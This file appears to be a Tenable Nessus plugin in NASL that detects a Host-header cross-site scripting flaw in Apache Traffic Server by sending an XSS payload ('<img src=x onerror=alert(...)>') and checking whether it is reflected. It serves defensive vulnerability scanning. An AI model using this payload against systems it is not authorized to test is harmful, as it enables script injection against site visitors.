#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(79624);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 20:59:28 $");

  script_bugtraq_id(70970);

  script_name(english:"Apache Traffic Server Host HTTP XSS");
  script_summary(english:"Checks the Apache Traffic Server response.");

  script_set_attribute(attribute:"synopsis", value:
"The remote caching server is affected by a cross-site scripting
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Apache Traffic Server running on the remote host is
affected by a cross-site scripting vulnerability due to a failure to
properly sanitize user-supplied input. By sending a specially crafted
host header, a remote, unauthenticated attacker can execute arbitrary
script code in the victim's browser in the context of the affected
site.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q4/545");
  script_set_attribute(attribute:"solution", value:"Upgrade to Apache Traffic Server 4.2.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/11/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/03/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/11/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:traffic_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("apache_traffic_server_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/apache_traffic_server");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

app = "Apache Traffic Server";

port = get_http_port(default:8080);

# Make sure this is Apache Traffic Server
get_kb_item_or_exit('www/'+port+'/apache_traffic_server');

alert = '<img src=x onerror=alert(\'' + SCRIPT_NAME + '\')>';

res = http_send_recv3(
  method:"GET",
  item:"/",
  port:port,
  fetch404:TRUE,
  add_headers:make_array("Host", alert)
);

url = build_url(port:port, qs:"/");

if (isnull(res) || isnull(res[2]) || alert >!< res[2])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

if (report_verbosity > 0)
{
  report =
    '\n' + 'Nessus was able to exploit the issue at :' +
    '\n' + 
    '\n' + '  ' + url +
    '\n' + 
    '\n' + 'using the following Host header :' +
    '\n' + 
    '\n' + '  ' + alert +
    '\n' +
    '\n' + 'It produced the following response :' +
    '\n' +
    '\n' + res[2];
  security_warning(port:port, extra:report);
}
else security_warning(port);
